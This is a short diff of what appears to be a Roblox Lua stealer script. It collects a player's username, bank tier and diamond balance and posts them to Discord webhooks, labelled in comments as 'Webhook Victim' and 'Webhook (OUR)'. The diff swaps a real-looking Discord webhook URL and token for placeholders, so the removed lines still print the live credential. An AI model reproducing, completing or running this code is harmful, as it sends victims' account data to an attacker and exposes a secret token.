@@ -20,10 +20,9 @@ local function getexploit()
 end
 local username = game:GetService("Players").LocalPlayer.Name
 local fardplayer = game.Players.LocalPlayer
-local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 local tier = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text, "%,", "")
 local diamondb = game.Players.LocalPlayer.PlayerGui.Bank.Frame.Container.Bank.Bottom.Balance.Amount.Text
-local eurl = "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"
+local eurl = "WEBHOOKHERE"
 request = http_request or request or HttpPost or syn.request
 local error1 = {
   ["embeds"] = {{
@@ -309,7 +308,7 @@ local data1 = {
 -- End Webhoook Victim
 
 -- Webhook (OUR)
-local YourWebHookHere =  "https://discord.com/api/webhooks/1051980465357193217/MH38lVvLSieQgVz_bZsYEtVhZtRfk1TAlhH8HeM1o03HjwbEDKnkpLw5V09XJU4SnD82"  -- web hook here
+local YourWebHookHere =  "WEBHOOK"  -- web hook here
 local url = YourWebHookHere
 request = http_request or request or HttpPost or syn.request
  
